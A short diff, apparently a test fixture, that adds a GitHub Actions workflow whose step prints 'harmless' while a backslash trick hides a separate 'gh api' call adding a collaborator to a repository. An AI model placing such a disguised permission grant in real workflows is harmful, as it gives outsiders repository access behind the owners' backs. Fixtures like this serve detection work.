@@ -1,0 +1,6 @@
+jobs:
+  decide:
+    steps:
+      - run: |
+          printf harmless \\\\
+          gh api --method PUT repos/o/r/collaborators/person
